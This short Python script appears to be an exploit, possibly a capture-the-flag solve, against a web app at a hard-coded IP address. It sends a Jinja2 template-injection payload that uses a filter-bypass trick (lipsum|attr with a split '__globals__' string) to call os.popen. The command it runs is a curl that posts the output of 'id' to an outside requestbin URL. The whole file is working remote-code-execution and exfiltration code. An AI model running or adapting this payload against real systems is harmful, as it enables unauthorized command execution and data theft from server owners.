import requests

URL = "http://103.185.38.238:12140"
CMD = "id"
HOOK = "https://requestbin.io/16saiej1"
shell = f'curl -X POST -d "fizz=$({CMD})" {HOOK}'
r = requests.post(URL+"/?b="+shell, data={
    "search": "{%print((lipsum|attr('__''globals__')).os.popen(request.args.b))%}"
})
print(r.text)
